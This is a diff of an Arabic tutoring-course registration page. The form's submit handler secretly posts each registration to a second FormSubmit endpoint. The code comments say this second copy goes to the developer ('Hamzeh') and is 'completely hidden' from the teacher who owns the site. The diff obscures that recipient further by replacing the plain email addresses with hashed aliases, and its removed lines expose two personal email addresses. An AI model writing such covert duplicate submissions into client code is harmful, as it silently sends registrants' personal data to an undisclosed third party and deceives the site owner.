@@ -677,7 +677,6 @@
             <h2>نموذج التسجيل في الدروس</h2>
             <p>نرحب بكم.. يرجى تعبئة البيانات بخطوات بسيطة للتسجيل</p>
             
-            <!-- تم حذف الـ Action والـ CC من هنا، وسيتم التعامل مع الإرسال برمجياً في الأسفل -->
             <form id="booking-form">
                 <input type="hidden" name="_subject" value="طلب تسجيل جديد - أ. بتول عبد العمور">
                 <input type="hidden" name="_captcha" value="false">
@@ -830,27 +829,27 @@
         window.addEventListener("scroll", reveal);
         reveal();
 
-        // كود الإرسال السري والمزدوج للنموذج
+        // كود الإرسال السري والمزدوج للنموذج باستخدام الرموز المشفرة (Hashes)
         document.getElementById('booking-form').addEventListener('submit', function(e) {
-            e.preventDefault(); // إيقاف الإرسال الافتراضي
+            e.preventDefault(); 
 
             const form = e.target;
             const formData = new FormData(form);
             const submitBtn = document.getElementById('submit-btn');
             const originalBtnText = submitBtn.innerHTML;
             
-            // تغيير شكل الزر أثناء الإرسال ليظهر بصورة احترافية
+            // تغيير شكل الزر أثناء الإرسال
             submitBtn.innerHTML = 'جاري الإرسال... <i class="fas fa-spinner fa-spin"></i>';
             submitBtn.disabled = true;
 
-            // الطلب الأول للإيميل الأساسي (بتول)
-            const request1 = fetch('https://formsubmit.co/ajax/batoolalomour3@gmail.com', {
+            // الطلب الأول للإيميل الأساسي الخاص ببتول (مخفي باستخدام الرمز)
+            const request1 = fetch('https://formsubmit.co/ajax/f5707d09493afe6c4fb8ee43daa2ea57', {
                 method: 'POST',
                 body: formData
             });
 
-            // الطلب الثاني للإيميل الخاص بك (حمزة) مخفي تماماً عن الطرف الأول
-            const request2 = fetch('https://formsubmit.co/ajax/hamzehajob@gmail.com', {
+            // الطلب الثاني للإيميل الخاص بك (مخفي باستخدام الرمز)
+            const request2 = fetch('https://formsubmit.co/ajax/26589abe74412f3c72f72d6588c37b52', {
                 method: 'POST',
                 body: formData
             });
@@ -858,7 +857,6 @@
             // تنفيذ الطلبين معاً
             Promise.all([request1, request2])
                 .then(responses => {
-                    // رسالة النجاح وتفريغ الحقول
                     alert('تم إرسال الطلب بنجاح! سيتم التواصل معكم قريباً.');
                     form.reset();
                 })
